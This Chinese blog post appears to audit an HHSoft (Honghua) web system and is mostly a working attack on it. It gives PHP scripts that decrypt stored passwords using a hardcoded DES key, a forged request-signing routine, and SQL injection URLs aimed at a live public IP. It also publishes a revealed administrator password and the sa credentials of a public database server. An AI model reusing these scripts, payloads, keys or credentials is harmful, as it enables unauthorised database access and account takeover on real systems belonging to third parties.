<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT TOP 100 * FROM [honghua2703].dbo.[Sys_Account]</span><br></pre></td></tr></table></figure>

<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/187368/1/37164/63668/64edb133Fd70da356/24f56a48fe8b59f6.jpg" alt="image.png"></p>
<p>这里密码被加密了，我们暂时不知道是什么加密形式，利用弱口令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000001</span><br><span class="line">000001</span><br></pre></td></tr></table></figure>

<p>登陆成功，如下这里会判断原密码是否正确</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/221135/15/35340/41314/64edb16dFe0102493/0ba29db666d58078.jpg" alt="image.png"></p>
<p>这个方法ValidationOldPassword接收我们输入的密码后和原先比较进行判断是否正确，猜测有加密过程</p>
<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/134316/11/37787/116205/64edb193F12a900a7/e9721c6b4be50f3a.jpg" alt="image.png"></p>
<p>定位，这里经过处理直接判断相等</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/88362/23/40841/53347/64edb1e5F5430954e/25d05e8013a7ab4e.jpg" alt="image.png"></p>
<p><code>bin/HHSoft.Common/HHSoft.Common/Crypto.cs</code>下，回调SEncryptString方法</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/177314/25/36765/34229/64edb2ecF318d2b4f/83cda92ee9b7e295.jpg" alt="image.png"></p>
<p>这里因为两个参数，所以是如下方法</p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/159817/4/30880/84199/64edb332F66b9ff92/06a1cc83a3ce080b.jpg" alt="image.png"></p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/205492/31/33764/19023/64edb372Fc5c2347e/cf2dd8701320867c.jpg" alt="image.png"></p>
<p>原客服密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">000001</span><br><span class="line">000001</span><br><span class="line">密文：30B0F381263212DB</span><br><span class="line">密钥：EIP888</span><br></pre></td></tr></table></figure>

<p>php版加密算法代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encryptString</span>(<span class="params"><span class="variable">$inputStr</span>, <span class="variable">$keyStr</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Convert input string and key to byte arrays</span></span><br><span class="line">    <span class="variable">$bytes</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$inputStr</span>, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    <span class="variable">$keyBytes</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$keyStr</span>, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform SHA1 hash on key bytes</span></span><br><span class="line">    <span class="variable">$array</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$keyBytes</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Extract 8 bytes for key and 8 bytes for IV from the array</span></span><br><span class="line">    <span class="variable">$sKey</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$array</span>, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="variable">$sIV</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$array</span>, <span class="number">8</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create DES object</span></span><br><span class="line">    <span class="variable">$des</span> = <span class="keyword">new</span> <span class="title class_">Des</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set key and IV</span></span><br><span class="line">    <span class="variable">$des</span>-&gt;<span class="title function_ invoke__">setKey</span>(<span class="variable">$sKey</span>);</span><br><span class="line">    <span class="variable">$des</span>-&gt;<span class="title function_ invoke__">setIV</span>(<span class="variable">$sIV</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Encrypt the input bytes</span></span><br><span class="line">    <span class="variable">$encryptedBytes</span> = <span class="variable">$des</span>-&gt;<span class="title function_ invoke__">encrypt</span>(<span class="variable">$bytes</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Convert encrypted bytes to hexadecimal string</span></span><br><span class="line">    <span class="variable">$encryptedStr</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$encryptedBytes</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encryptedStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Helper class for DES encryption</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Des</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$iv</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKey</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setIV</span>(<span class="params"><span class="variable">$iv</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;iv = <span class="variable">$iv</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&#x27;DES-CBC&#x27;</span>, <span class="variable">$this</span>-&gt;key, OPENSSL_RAW_DATA, <span class="variable">$this</span>-&gt;iv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Test the encryption with the provided input values</span></span><br><span class="line"><span class="variable">$inputStr</span> = <span class="string">&#x27;000001&#x27;</span>;</span><br><span class="line"><span class="variable">$keyStr</span> = <span class="string">&#x27;EIP888&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$encryptedStr</span> = <span class="title function_ invoke__">encryptString</span>(<span class="variable">$inputStr</span>, <span class="variable">$keyStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$encryptedStr</span>;  <span class="comment">// Output: 30B0F381263212DB</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/104742/18/43480/11481/64edb85fF0584c21f/39b7ab94782dc526.jpg" alt="image.png"></p>
<p>.</p>
<p>php版解密算法代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decryptString</span>(<span class="params"><span class="variable">$encryptedStr</span>, <span class="variable">$keyStr</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Convert encrypted string and key to byte arrays</span></span><br><span class="line">    <span class="variable">$encryptedBytes</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$encryptedStr</span>);</span><br><span class="line">    <span class="variable">$keyBytes</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$keyStr</span>, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform SHA1 hash on key bytes</span></span><br><span class="line">    <span class="variable">$array</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$keyBytes</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Extract 8 bytes for key and 8 bytes for IV from the array</span></span><br><span class="line">    <span class="variable">$sKey</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$array</span>, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="variable">$sIV</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$array</span>, <span class="number">8</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create DES object</span></span><br><span class="line">    <span class="variable">$des</span> = <span class="keyword">new</span> <span class="title class_">Des</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set key and IV</span></span><br><span class="line">    <span class="variable">$des</span>-&gt;<span class="title function_ invoke__">setKey</span>(<span class="variable">$sKey</span>);</span><br><span class="line">    <span class="variable">$des</span>-&gt;<span class="title function_ invoke__">setIV</span>(<span class="variable">$sIV</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decrypt the encrypted bytes</span></span><br><span class="line">    <span class="variable">$decryptedBytes</span> = <span class="variable">$des</span>-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="variable">$encryptedBytes</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Convert decrypted bytes to original string</span></span><br><span class="line">    <span class="variable">$decryptedStr</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$decryptedBytes</span>, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decryptedStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Helper class for DES decryption</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Des</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$iv</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKey</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setIV</span>(<span class="params"><span class="variable">$iv</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;iv = <span class="variable">$iv</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$data</span>, <span class="string">&#x27;DES-CBC&#x27;</span>, <span class="variable">$this</span>-&gt;key, OPENSSL_RAW_DATA, <span class="variable">$this</span>-&gt;iv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Test the decryption with the provided input values</span></span><br><span class="line"><span class="variable">$encryptedStr</span> = <span class="string">&#x27;30B0F381263212DB&#x27;</span>;</span><br><span class="line"><span class="variable">$keyStr</span> = <span class="string">&#x27;EIP888&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$decryptedStr</span> = <span class="title function_ invoke__">decryptString</span>(<span class="variable">$encryptedStr</span>, <span class="variable">$keyStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decryptedStr</span>;  <span class="comment">// Output: 000001</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我在数据库找另外一个验证：C4B0A1FE6ED9B465</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/137543/23/39373/128518/64edb926F9c5cc60d/c6c196c8fa6208f1.jpg" alt="image.png"></p>
<p>解密得到000022</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/133451/11/36258/11394/64edb949F36d4ab4a/a3eef3095e5ee630.jpg" alt="image.png"></p>
<p>之后我们直接去解密管理员密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin_bz / admin_xx</span><br><span class="line">honghua22083865</span><br></pre></td></tr></table></figure>

<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/99251/29/43640/100653/64edb9faF1cec9b13/7028062975cf22e7.jpg" alt="image.png"></p>
<p>.</p>
<h4 id="前台任意方法调用-SQL注入-1（展示部分）"><a href="#前台任意方法调用-SQL注入-1（展示部分）" class="headerlink" title="前台任意方法调用-SQL注入 * 1（展示部分）"></a>前台任意方法调用-SQL注入 * 1（展示部分）</h4><p><code>bin/HHSoft.Web/HHSoft.Web.Handlers/Api.cs</code></p>
<p>这里直接接收act参数，拼接在一起，指定一个类，下面就是通过Assembly.GetExecutingAssembly().CreateInstance对这个类进行实例化得到val，然后return调用val的Execute方法，我们直接挑重要的说</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/103158/36/28103/71974/64ee9cb8F98d1c178/7a326da7eaf13ddf.jpg" alt="image.png"></p>
<p>在<code>bin/HHSoft.Web/HHSoft.Web.Handlers.Subscibe/TelControlService.cs</code>下</p>
<p>我们令act=Subscibe.TelControlService，这里接收了三个值，令text和text2调用了CommonOperate.GetDataSign方法，如果成功令这个方法成立，那么就会到下面那个text2存在SQL注入的地方执行，否则就会返回”签名错误”</p>
<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/162603/22/35781/101511/64ee9d43F394899be/028506d2c01b0d89.jpg" alt="image.png"></p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/128986/38/40638/21772/64ee9d99F3de95375/cdf6eec6519cb70d.jpg" alt="image.png"></p>
<p>我们跟过去这个CommonOperate.GetDataSign方法，这个方法也很简单，我就直接构造了</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/109472/27/44800/64158/64ee9dccF3150e8e5/3c702de79fd79108.jpg" alt="image.png"></p>
<p>php版加密函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDataSign</span>(<span class="params"><span class="variable">$soruceStr</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">sort</span>(<span class="variable">$soruceStr</span>); <span class="comment">// 对输入数组进行排序</span></span><br><span class="line">    <span class="variable">$text</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$soruceStr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="variable">$text</span> .= <span class="variable">$item</span> . <span class="string">&quot;;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$text</span> .= <span class="string">&quot;HongHua123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">getMD5</span>(<span class="variable">$text</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMD5</span>(<span class="params"><span class="variable">$myString</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$bytes</span> = <span class="title function_ invoke__">utf8_encode</span>(<span class="variable">$myString</span>);</span><br><span class="line">    <span class="variable">$hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$bytes</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$base64</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$hash</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$base64</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&quot;1&#x27;&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">getDataSign</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我令text这个存在SQL注入的地方值为1’，令text2为2，得到text3是<code>2TxXWAehR/n05QMJOKWqmw==</code></p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/168385/18/39966/11980/64ee9e10F9ab003b5/162d00f9fcf21ac1.jpg" alt="image.png"></p>
<p>.</p>
<p>构造请求</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.76.250.171:8001/Handlers/api.ashx?act=Subscibe.TelControlService&amp;Mch_Code=1&#x27;&amp;Minutes=2&amp;Sign=2TxXWAehR/n05QMJOKWqmw==</span><br></pre></td></tr></table></figure>

<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/132140/4/39327/48363/64ee9e3aFe430d75e/28e22c5af7f08951.jpg" alt="image.png"></p>
<p>构造报错注入语句</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.76.250.171:8001/Handlers/api.ashx?act=Subscibe.TelControlService&amp;Mch_Code=&#x27;-(convert(int,db_name()))-&#x27;&amp;Minutes=aaaaaaaa&amp;Sign=MApsCoUHgxdQ1SXExfBIhQ==</span><br></pre></td></tr></table></figure>

<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/168800/29/41046/25379/64eea1c0F8a15c174/21e4fd9bf499aa45.jpg" alt="image.png"></p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/211801/39/36152/44923/64eea1ccF0ea8e4e0/6e70578b0e9b6bc3.jpg" alt="image.png"></p>
<p>这里必须要注意的是语句payload中不能出现+，否则在这里URL编码什么的会导致签名错误</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/142207/2/40336/47823/64eea1d4Fb5a0d55d/06bb28079478c3ec.jpg" alt="image.png"></p>
<p>.</p>
<h4 id="前台任意方法调用-SQL注入-2"><a href="#前台任意方法调用-SQL注入-2" class="headerlink" title="前台任意方法调用-SQL注入 * 2"></a>前台任意方法调用-SQL注入 * 2</h4><p>这里存在注入，但是必须先令<code>text2 == text3</code>，text2是我直接可控的，text3是一个算法计算出的</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/100739/18/34742/101800/64eeaf01Ff320347c/1547afc2eb1c0e10.jpg" alt="image.png"></p>
<p>首先是：<code>ValidateSn.GetMid()</code></p>
<p>这里分别取这些值，这些过程分析我就不写了，直接给php加密脚本</p>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/101283/33/44224/78130/64eeb086Fab4fd428/7576a90c2aecf0ab.jpg" alt="image.png"></p>
<p>php版</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$text</span>, <span class="variable">$sKey</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$sKey</span>), <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$sKey</span>), <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$text</span> = <span class="title function_ invoke__">utf8_encode</span>(<span class="variable">$text</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_DES, <span class="string">&#x27;&#x27;</span>, MCRYPT_MODE_CBC, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="title function_ invoke__">mcrypt_generic</span>(<span class="variable">$cipher</span>, <span class="variable">$text</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$cipher</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$cipher</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$encrypted</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用示例</span></span><br><span class="line"><span class="variable">$cPU</span> = <span class="string">&quot;BFEBFBFF000506E3&quot;</span>;</span><br><span class="line"><span class="variable">$mAC</span> = <span class="string">&quot;HH11CE-BFC1-08002BE10318&quot;</span>;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;t&quot;</span>;</span><br><span class="line"><span class="variable">$value2</span> = <span class="string">&quot;fa8e192e-1d60-447f-9377-875a7ab6cae2&quot;</span>;</span><br><span class="line"><span class="variable">$value3</span> = <span class="string">&quot;张芳1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$cPU</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$mAC</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$value</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$value2</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$value3</span>;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;hhsoft-mid&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">encrypt</span>(<span class="variable">$text</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后回到之前的<code>ValidateSn.MD5Encrypt(ValidateSn.GetMid() + value, text);</code></p>
<p>调用了MD5Encrypt方法</p>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/197241/31/38277/58152/64eeb0fcFce3593f9/043dc3736c506e32.jpg" alt="image.png"></p>
<p>编写此php脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5Encrypt</span>(<span class="params"><span class="variable">$text</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$text</span> . <span class="string">&quot;##&quot;</span> . <span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$text</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hash</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用示例</span></span><br><span class="line"><span class="variable">$text</span> = <span class="string">&quot;5b70ce54e00473e37b2c49e55083ba0855b32aa2fd4f7558dff251d56f17f4bd33582eccb1de38e770d83e91470cae8f17c63886a2bc034b840498502b504b4d1fbe0c43741e618d37479edc16ced6793bacc84d6607b1ee1356832b59c9e917张芳1&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">md5Encrypt</span>(<span class="variable">$text</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后来发现这里虽然存在注入，但是不好相等，放弃</p>
<h4 id="通用弱口令"><a href="#通用弱口令" class="headerlink" title="通用弱口令"></a>通用弱口令</h4><p>之前我们在XmlConfig文件夹下的database.config下可以找到数据库连接账号和密码，但是有些系统里会有指定了两种连接方式，一种是连接本机，或者内网其他主机，格式如下</p>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/98199/17/24823/66264/64fdb910Fe0e1be9d/0bbc816e607ec6c0.jpg" alt="image.png"></p>
<p>另一种是连接在一个公网的ip的账号和密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">公网地址：39.102.129.52</span><br><span class="line">默认连接数据库：honghua2703</span><br><span class="line">账号：sa</span><br><span class="line">密码：honghua22083865</span><br></pre></td></tr></table></figure>

<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/188163/32/37044/52946/64fdb96dF66c0ea8f/11cbe5a12e8418ed.jpg" alt="image.png"></p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/126197/20/40440/14053/64fdb9bfF1ee8554f/3051e1649cc98076.jpg" alt="image.png"></p>
<p>新建查询，直接找到管理员密码信息所在表</p>
